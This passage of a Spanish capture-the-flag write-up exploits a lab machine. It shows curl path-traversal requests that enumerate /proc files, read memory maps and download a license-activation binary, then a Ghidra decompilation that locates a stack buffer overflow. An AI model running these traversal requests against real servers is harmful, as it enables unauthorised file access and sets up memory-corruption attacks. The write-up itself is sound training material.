        <span class="mtk7">echo</span> <span class="mtk4">"error</span> <span class="mtk4">socket_connect()"</span> <span class="mtk5">.</span> <span class="mtk7">socket_strerror</span><span class="mtk1">(</span><span class="mtk7">socket_last_error</span><span class="mtk1">())</span> <span class="mtk5">.</span> <span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">;</span>  
    <span class="mtk1">}</span>

    <span class="mtk7">socket_write</span><span class="mtk1">($socket,</span> <span class="mtk7">pack</span><span class="mtk1">(</span><span class="mtk4">"N"</span><span class="mtk1">,</span> <span class="mtk1">$license_size));</span>
    <span class="mtk7">socket_write</span><span class="mtk1">($socket,</span> <span class="mtk1">$license);</span>

    <span class="mtk7">socket_shutdown</span><span class="mtk1">($socket);</span>
    <span class="mtk7">socket_close</span><span class="mtk1">($socket);</span>
<span class="mtk1">}</span>
</code></pre></div><p>Interesante, se est谩 conectando a un servidor de <em>sockets</em> en local en el puerto 1337 y le pasa el tama帽o del archivo y su contenido.</p><p>Como tenemos una vulnerabilidad de <em>Directory Path Traversal</em>, podemos enumerar procesos leyendo desde <code>/proc/&lt;PID></code>. Cada directorio &ldquo;PID&rdquo; contiene algunos archivos relacionados con el proceso en s铆. Nos interesa <code>/proc&lt;PID>/cmdline</code> para saber el comando usado para iniciar el proceso. Vamos a usar fuerza bruta para enumerar procesos y ver si hay alguno que se ejecute en el puerto 1337:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-yellow">for</span> i in {1..1000}; <span class="code-dark-yellow">do</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">"<span class="code-dark-cyan">$i</span>: "</span>; <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"10.10.11.154?page=/proc/<span class="code-dark-cyan">$i</span>/cmdline"</span> -so -; <span class="code-dark-green">echo</span>; <span class="code-dark-yellow">done</span> | <span class="code-dark-green">grep</span> -a <span class="code-dark-yellow">': .'</span>  
411<span class="code-red">: /</span>usr/bin/activate_license1337
576<span class="code-red">: n</span>ginx<span class="code-red">: w</span>orker process
577<span class="code-red">: n</span>ginx<span class="code-red">: w</span>orker process
</code></pre></div><p>N贸tese que hay algunos bytes nulos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.154?page=/proc/411/cmdline'</span> -so - | <span class="code-dark-green">xxd</span>
00000000: 2f75 7372 2f62 696e 2f61 6374 6976 6174  /usr/bin/activat  
00000010: 655f 6c69 6365 6e73 6500 3133 3337 00    e_license.1337.

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.154?page=/proc/426/cmdline'</span> -so - | <span class="code-dark-green">tr</span> <span class="code-dark-yellow">'\0'</span> <span class="code-dark-yellow">' '</span>
/usr/bin/activate_license 1337
</code></pre></div><p>Genial, parece que tenemos un archivo llamado <code>/usr/bin/activate_license</code>, vamos a descargarlo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.154?page=/usr/bin/activate_license'</span> &gt; activate_license

<span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">activate_license</span>
activate_license: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=554631debe5b40be0f96cabea315eedd2439fb81, for GNU/Linux 3.2.0, with debug_info, not stripped  
</code></pre></div><h3 id="an谩lisis-de-un-binario">An谩lisis de un binario</h3><p>Se trata de un binario ELF de 64 bits&mldr; Esto se pone interesante&mldr; El hecho de que la clave de licencia tenga un tama帽o fijo indica que el binario podr铆a ser vulnerable a <em>Buffer Overflow</em>. Estas son las protecciones del binario:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">checksec</span> <span class="mtku">activate_license</span>
[<span class="code-blue">*</span>] './activate_license'
    Arch:     amd64-64-little  
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
</code></pre></div><p>Mmm, muy protegido&mldr; Necesitaremos al menos dos direcciones en tiempo de ejecuci贸n: una de Glibc para burlar ASLR y otra del binario para burlar PIE. Adem谩s, como NX est谩 habilitado, tendremos que usar <em>Return Oriented Programming</em> (ROP).</p><p>Vamos a emplear Ghidra para descompilar el binario y analizarlo. Esta es la funci贸n <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span> <span class="mtk8">main</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">argc</span><span class="mtk1">,</span> <span class="mtk7 mtki">char</span> <span class="mtk5">**</span><span class="mtk9 mtki">argv</span><span class="mtk1">)</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">iVar1;</span>
  <span class="mtk7 mtki">__pid_t</span> <span class="mtk1">_Var2;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk5">*</span><span class="mtk1">piVar3;</span>
  <span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">pcVar4;</span>
  <span class="mtk7 mtki">char</span> <span class="mtk1">clientaddr_s[</span><span class="mtk6">16</span><span class="mtk1">];</span>
  <span class="mtk1">sockaddr_in</span> <span class="mtk1">clientaddr;</span>
  <span class="mtk7 mtki">socklen_t</span> <span class="mtk1">clientaddrlen;</span>
  <span class="mtk1">sockaddr_in</span> <span class="mtk1">server;</span>
  <span class="mtk7 mtki">uint16_t</span> <span class="mtk1">port;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">clientfd;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">serverfd;</span>

  <span class="mtk5">if</span> <span class="mtk1">(argc</span> <span class="mtk5">!=</span> <span class="mtk6">2</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk4">"specify</span> <span class="mtk4">port</span> <span class="mtk4">to</span> <span class="mtk4">bind</span> <span class="mtk4">to"</span><span class="mtk1">);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">__isoc99_sscanf</span><span class="mtk1">(argv[</span><span class="mtk6">1</span><span class="mtk1">],</span> <span class="mtk4">"</span><span class="mtk6">%hu</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">port);</span>
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">piVar3</span> <span class="mtk5">=</span> <span class="mtk8">__errno_location</span><span class="mtk1">();</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk8">strerror</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">piVar3);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[+]</span> <span class="mtk4">starting</span> <span class="mtk4">server</span> <span class="mtk4">listening</span> <span class="mtk4">on</span> <span class="mtk4">port</span> <span class="mtk6">%d\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">(ulong)</span> <span class="mtk1">port);</span>
  <span class="mtk1">server.sin_family</span> <span class="mtk5">=</span> <span class="mtk6">2</span><span class="mtk1">;</span>
  <span class="mtk1">server.sin_addr</span> <span class="mtk5">=</span> <span class="mtk8">htonl</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">7f000001</span><span class="mtk1">);</span>
  <span class="mtk1">server.sin_port</span> <span class="mtk5">=</span> <span class="mtk8">htons</span><span class="mtk1">(port);</span>
  <span class="mtk1">serverfd</span> <span class="mtk5">=</span> <span class="mtk8">socket</span><span class="mtk1">(</span><span class="mtk6">2</span><span class="mtk1">,</span> <span class="mtk6">1</span><span class="mtk1">,</span> <span class="mtk6">6</span><span class="mtk1">);</span>
  <span class="mtk5">if</span> <span class="mtk1">(serverfd</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">piVar3</span> <span class="mtk5">=</span> <span class="mtk8">__errno_location</span><span class="mtk1">();</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk8">strerror</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">piVar3);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">bind</span><span class="mtk1">(serverfd,</span> <span class="mtk1">(sockaddr</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">server,</span> <span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">);</span>
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">piVar3</span> <span class="mtk5">=</span> <span class="mtk8">__errno_location</span><span class="mtk1">();</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk8">strerror</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">piVar3);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">listen</span><span class="mtk1">(serverfd,</span> <span class="mtk6">100</span><span class="mtk1">);</span>
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">piVar3</span> <span class="mtk5">=</span> <span class="mtk8">__errno_location</span><span class="mtk1">();</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk8">strerror</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">piVar3);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[+]</span> <span class="mtk4">listening</span> <span class="mtk4">..."</span><span class="mtk1">);</span>

  <span class="mtk5">while</span> <span class="mtk1">(</span><span class="mtk6">true</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk5">while</span> <span class="mtk1">(</span><span class="mtk6">true</span><span class="mtk1">)</span> <span class="mtk1">{</span>
      <span class="mtk1">clientfd</span> <span class="mtk5">=</span> <span class="mtk8">accept</span><span class="mtk1">(serverfd,</span> <span class="mtk1">(sockaddr</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">clientaddr,</span> <span class="mtk5">&amp;</span><span class="mtk1">clientaddrlen);</span>
      <span class="mtk5">if</span> <span class="mtk1">(clientfd</span> <span class="mtk5">!=</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk5">break</span><span class="mtk1">;</span>
      <span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"Error:</span> <span class="mtk4">accepting</span> <span class="mtk4">client</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk6">1</span><span class="mtk1">,</span> <span class="mtk5">0x</span><span class="mtk6">18</span><span class="mtk1">,</span> <span class="mtk1">stderr);</span>
    <span class="mtk1">}</span>

    <span class="mtk8">inet_ntop</span><span class="mtk1">(</span><span class="mtk6">2</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">clientaddr.sin_addr,</span> <span class="mtk1">clientaddr_s,</span> <span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">);</span>
    <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[+]</span> <span class="mtk4">accepted</span> <span class="mtk4">client</span> <span class="mtk4">connection</span> <span class="mtk4">from</span> <span class="mtk6">%s</span><span class="mtk4">:</span><span class="mtk6">%d\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">clientaddr_s,</span> <span class="mtk1">(ulong)</span> <span class="mtk1">clientaddr.sin_port);</span>  
    <span class="mtk1">_Var2</span> <span class="mtk5">=</span> <span class="mtk8">fork</span><span class="mtk1">();</span>
    <span class="mtk5">if</span> <span class="mtk1">(_Var2</span> <span class="mtk5">==</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk5">break</span><span class="mtk1">;</span>
    <span class="mtk8">__sysv_signal</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">11</span><span class="mtk1">,</span> <span class="mtk1">(</span><span class="mtk7 mtki">__sighandler_t</span><span class="mtk1">)</span> <span class="mtk5">0x</span><span class="mtk6">1</span><span class="mtk1">);</span>
    <span class="mtk8">close</span><span class="mtk1">(clientfd);</span>
  <span class="mtk1">}</span>

  <span class="mtk8">close</span><span class="mtk1">(serverfd);</span>
  <span class="mtk8">activate_license</span><span class="mtk1">(clientfd);</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
  <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>Simplemente inicia un servidor de <em>sockets</em> en el puerto 1337. Cada vez que se recibe una nueva conexi贸n, el proceso usa <code>fork</code> (que significa que el proceso padre sigue escuchando por nuevas conexiones y no se romper谩). El proceso hijo ejecuta la funci贸n <code>activate_license</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span> <span class="mtk8">activate_license</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">sockfd</span><span class="mtk1">)</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">iVar1;</span>
  <span class="mtk7 mtki">ssize_t</span> <span class="mtk1">sVar2;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk5">*</span><span class="mtk1">piVar3;</span>
  <span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">pcVar4;</span>
  <span class="mtk1">sqlite3_stmt</span> <span class="mtk5">*</span><span class="mtk1">stmt;</span>
  <span class="mtk1">sqlite3</span> <span class="mtk5">*</span><span class="mtk1">db;</span>
  <span class="mtk7 mtki">uint32_t</span> <span class="mtk1">msglen;</span>
  <span class="mtk7 mtki">char</span> <span class="mtk1">buffer[</span><span class="mtk6">512</span><span class="mtk1">];</span>

  <span class="mtk1">sVar2</span> <span class="mtk5">=</span> <span class="mtk8">read</span><span class="mtk1">(sockfd,</span> <span class="mtk5">&amp;</span><span class="mtk1">msglen,</span> <span class="mtk6">4</span><span class="mtk1">);</span>
  <span class="mtk5">if</span> <span class="mtk1">(sVar2</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">piVar3</span> <span class="mtk5">=</span> <span class="mtk8">__errno_location</span><span class="mtk1">();</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk8">strerror</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">piVar3);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">msglen</span> <span class="mtk5">=</span> <span class="mtk8">ntohl</span><span class="mtk1">(msglen);</span>
  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[+]</span> <span class="mtk4">reading</span> <span class="mtk6">%d</span> <span class="mtk4">bytes</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">(ulong)</span> <span class="mtk1">msglen);</span>
  <span class="mtk1">sVar2</span> <span class="mtk5">=</span> <span class="mtk8">read</span><span class="mtk1">(sockfd,</span> <span class="mtk1">buffer,</span> <span class="mtk1">(ulong)</span> <span class="mtk1">msglen);</span>
  <span class="mtk5">if</span> <span class="mtk1">(sVar2</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">piVar3</span> <span class="mtk5">=</span> <span class="mtk8">__errno_location</span><span class="mtk1">();</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk8">strerror</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">piVar3);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">sqlite3_open</span><span class="mtk1">(</span><span class="mtk4">"license.sqlite"</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">db);</span>
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk8">sqlite3_errmsg</span><span class="mtk1">(db);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk8">sqlite3_busy_timeout</span><span class="mtk1">(db,</span> <span class="mtk6">2000</span><span class="mtk1">);</span>
  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">sqlite3_exec</span><span class="mtk1">(db,</span> <span class="mtk4">"CREATE</span> <span class="mtk4">TABLE</span> <span class="mtk4">IF</span> <span class="mtk4">NOT</span> <span class="mtk4">EXISTS</span> <span class="mtk4">license</span> <span class="mtk4">(</span>   <span class="mtk4">id</span> <span class="mtk4">INTEGER</span> <span class="mtk4">PRIMARY</span> <span class="mtk4">KEY</span> <span class="mtk4">AUTOINCREMENT,</span>    <span class="mtk4">license_key</span> <span class="mtk4">TEXT)"</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">);</span>  
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk8">sqlite3_errmsg</span><span class="mtk1">(db);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">sqlite3_prepare_v2</span><span class="mtk1">(db,</span> <span class="mtk4">"INSERT</span> <span class="mtk4">INTO</span> <span class="mtk4">license</span> <span class="mtk4">(license_key)</span> <span class="mtk4">VALUES</span> <span class="mtk4">(?)"</span><span class="mtk1">,</span> <span class="mtk5">0x</span><span class="mtk6">ffffffff</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">stmt,</span> <span class="mtk6">0</span><span class="mtk1">);</span>
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk8">sqlite3_errmsg</span><span class="mtk1">(db);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">sqlite3_bind_text</span><span class="mtk1">(stmt,</span> <span class="mtk6">1</span><span class="mtk1">,</span> <span class="mtk1">buffer,</span> <span class="mtk5">0x</span><span class="mtk6">200</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">);</span>
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk8">sqlite3_errmsg</span><span class="mtk1">(db);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">sqlite3_step</span><span class="mtk1">(stmt);</span>
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">!=</span> <span class="mtk5">0x</span><span class="mtk6">65</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk8">sqlite3_errmsg</span><span class="mtk1">(db);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>
  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">sqlite3_reset</span><span class="mtk1">(stmt);</span>
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk8">sqlite3_errmsg</span><span class="mtk1">(db);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">sqlite3_finalize</span><span class="mtk1">(stmt);</span>
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk8">sqlite3_errmsg</span><span class="mtk1">(db);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">sqlite3_close</span><span class="mtk1">(db);</span>
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk8">sqlite3_errmsg</span><span class="mtk1">(db);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[+]</span> <span class="mtk4">activated</span> <span class="mtk4">license:</span> <span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">buffer);</span>
  <span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Podr铆amos mirar si las consultas de SQL son inyectables, pero no lo son. Entonces, el camino tiene que ser mediante explotaci贸n de binarios. La vulnerabilidad de <em>Buffer Overflow</em> est谩 aqu铆:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span> <span class="mtk8">activate_license</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">sockfd</span><span class="mtk1">)</span> <span class="mtk1">{</span>
  <span class="mtk3">// ...</span>

  <span class="mtk7 mtki">int</span> <span class="mtk1">iVar1;</span>
  <span class="mtk7 mtki">ssize_t</span> <span class="mtk1">sVar2;</span>
  <span class="mtk7 mtki">uint32_t</span> <span class="mtk1">msglen;</span>
  <span class="mtk7 mtki">char</span> <span class="mtk1">buffer[</span><span class="mtk6">512</span><span class="mtk1">];</span>

  <span class="mtk1">sVar2</span> <span class="mtk5">=</span> <span class="mtk8">read</span><span class="mtk1">(sockfd,</span> <span class="mtk5">&amp;</span><span class="mtk1">msglen,</span> <span class="mtk6">4</span><span class="mtk1">);</span>

  <span class="mtk3">// ...</span>

  <span class="mtk1">msglen</span> <span class="mtk5">=</span> <span class="mtk8">ntohl</span><span class="mtk1">(msglen);</span>
  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[+]</span> <span class="mtk4">reading</span> <span class="mtk6">%d</span> <span class="mtk4">bytes</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">(ulong)</span> <span class="mtk1">msglen);</span>  
  <span class="mtk1">sVar2</span> <span class="mtk5">=</span> <span class="mtk8">read</span><span class="mtk1">(sockfd,</span> <span class="mtk1">buffer,</span> <span class="mtk1">(ulong)</span> <span class="mtk1">msglen);</span>

  <span class="mtk3">// ...</span>
}
</code></pre></div><p>La primera instrucci贸n <code>read</code> lee el tama帽o del archivo, y la segunda copia el contenido del archivo en <code>buffer</code>. Como podemos controlar el tama帽o del archivo, podemos desbordar el <em>buffer</em> reservado de <code>buffer</code> (que es 512 bytes) y por tanto modificar la direcci贸n de retorno guardada en la pila (<em>stack</em>).</p><h3 id="preparaci贸n-del-_exploit_">Preparaci贸n del <em>exploit</em></h3><p>El binario no puede ser explotado mediante un ataque Ret2Libc com煤n. El problema es que no tenemos comunicaci贸n directa con el binario. En su lugar, tenemos que enviar el <em>payload</em> como un archivo al servidor PHP y este ser谩 pasado al binario. No obtendremos ninguna salida, por lo que no podemos usar fugas de memoria.</p><p>Sin embargo, podemos obtener la informaci贸n necesaria de <code>/proc/&lt;PID>/maps</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.154?page=/proc/411/maps'</span>
5631036d6000-5631036d7000 r--p 00000000 08:01 2408                       /usr/bin/activate_license
5631036d7000-5631036d8000 r-xp 00001000 08:01 2408                       /usr/bin/activate_license
5631036d8000-5631036d9000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
5631036d9000-5631036da000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
5631036da000-5631036db000 rw-p 00003000 08:01 2408                       /usr/bin/activate_license
563104ac4000-563104ae5000 rw-p 00000000 00:00 0                          [heap]
7f8f07aa9000-7f8f07aab000 rw-p 00000000 00:00 0
7f8f07aab000-7f8f07aac000 r--p 00000000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f8f07aac000-7f8f07aae000 r-xp 00001000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f8f07aae000-7f8f07aaf000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f8f07aaf000-7f8f07ab0000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f8f07ab0000-7f8f07ab1000 rw-p 00004000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f8f07ab1000-7f8f07ab8000 r--p 00000000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f8f07ab8000-7f8f07ac8000 r-xp 00007000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f8f07ac8000-7f8f07acd000 r--p 00017000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f8f07acd000-7f8f07ace000 r--p 0001b000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f8f07ace000-7f8f07acf000 rw-p 0001c000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f8f07acf000-7f8f07ad3000 rw-p 00000000 00:00 0
7f8f07ad3000-7f8f07ae2000 r--p 00000000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
